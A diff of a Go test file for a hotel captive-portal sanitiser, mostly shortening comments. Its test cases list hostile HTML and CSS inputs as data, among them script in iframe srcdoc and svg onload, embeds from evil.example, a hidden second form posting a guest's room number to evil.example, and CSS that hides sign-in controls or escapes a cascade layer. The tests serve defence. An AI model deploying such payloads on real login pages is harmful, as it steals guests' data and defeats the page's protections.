@@ -1,12 +1,8 @@
 package portaldesign
 
-// THE ADVERSARIAL SUITE.
-//
-// Every case below is a way a real attempt would be spelled against the page that collects room numbers,
-// surnames and voucher codes. Each one asserts TWO things: that the sanitiser reports it (so edged refuses the
-// design and tells the operator why), and that the sanitised output -- what portald actually serves -- no longer
-// contains the dangerous part. Reporting without removing would leave portald's defence in depth empty;
-// removing without reporting would let an operator believe the page shows what they wrote.
+// Adversarial cases, each asserting two things: the sanitiser reports it (edged refuses the design) and the
+// output portald serves no longer contains it. Reporting without removing empties portald's defence;
+// removing without reporting lets an operator believe the page shows what they wrote.
 
 import (
 	"strings"
@@ -48,7 +44,7 @@ func TestHTMLRefusesEveryKnownWayToRunScriptOrStealTheForm(t *testing.T) {
 		{"iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`, []string{"srcdoc", "script"}},
 		{"an object", `<object data="https://evil.example"></object>`, []string{"<object"}},
 		{"an embed", `<embed src="https://evil.example/x.swf">`, []string{"<embed"}},
-		// A SECOND FORM: no script at all, and it posts the guest's room number wherever it likes.
+		// A second form needs no script to post the guest's room number elsewhere.
 		{"a second form", `<form action="https://evil.example"><input name="room"></form>`, []string{"<form", "<input", "evil"}},
 		{"svg onload", `<svg onload="alert(1)"><circle r="4"/></svg>`, []string{"<svg", "onload"}},
 		{"script inside svg", `<svg><script>alert(1)</script></svg>`, []string{"<svg", "<script"}},
@@ -198,8 +194,7 @@ func TestCSSRefusesLoadersAndExecutables(t *testing.T) {
 	}
 }
 
-// !important IN A LAYER BEATS EVERY NORMAL UNLAYERED DECLARATION. The portal wraps this sheet in @layer hotel
-// and keeps an unlayered guard over the sign-in controls; the guard only holds if nothing here is important.
+// A layered !important beats unlayered declarations, so the unlayered guard only holds if nothing here is important.
 func TestCSSRemovesImportantSoTheGuardCannotBeOutranked(t *testing.T) {
 	for _, in := range []string{
 		`form { display: none !important; }`,
@@ -227,8 +222,7 @@ func TestCSSRemovesImportantSoTheGuardCannotBeOutranked(t *testing.T) {
 	}
 }
 
-// A STRAY BRACE MUST NOT ESCAPE THE LAYER. The page inserts "@layer hotel {" + sheet + "}"; a sheet that closed
-// the brace itself would put what followed outside the layer, where it outranks the guard.
+// The page inserts "@layer hotel {" + sheet + "}"; a sheet closing the brace itself would escape the layer and outrank the guard.
 func TestCSSOutputIsAlwaysBalanced(t *testing.T) {
 	for _, in := range []string{
 		`} form { display: none } .x {`,
@@ -317,8 +311,7 @@ func TestLinkAndImageRules(t *testing.T) {
 	}
 }
 
-// AN IMAGE WITH NO alt IS READ OUT BY ITS FILE NAME (WCAG 1.1.1). It is served as written, with a warning;
-// alt="" says the image is decoration and is not reported.
+// Missing alt is served as written with a warning; alt="" (decoration) is not reported.
 func TestHTMLWarnsAboutAnImageWithNoAlt(t *testing.T) {
 	out, issues := SanitizeHTML(`<p><img src="/assets/a.png"><img src="/assets/b.png" width="20"></p>`)
 	if hasError(issues) {
@@ -338,7 +331,7 @@ func TestHTMLWarnsAboutAnImageWithNoAlt(t *testing.T) {
 	}
 }
 
-// A FOCUS RING TAKEN AWAY BY THE HOTEL'S CSS is served (the portal's guard keeps its own ring) but reported.
+// A focus ring removed by the hotel's CSS is served (the guard keeps its own ring) but reported.
 func TestCSSWarnsWhenAFocusOutlineIsRemoved(t *testing.T) {
 	for _, in := range []string{
 		`a:focus { outline: none }`,
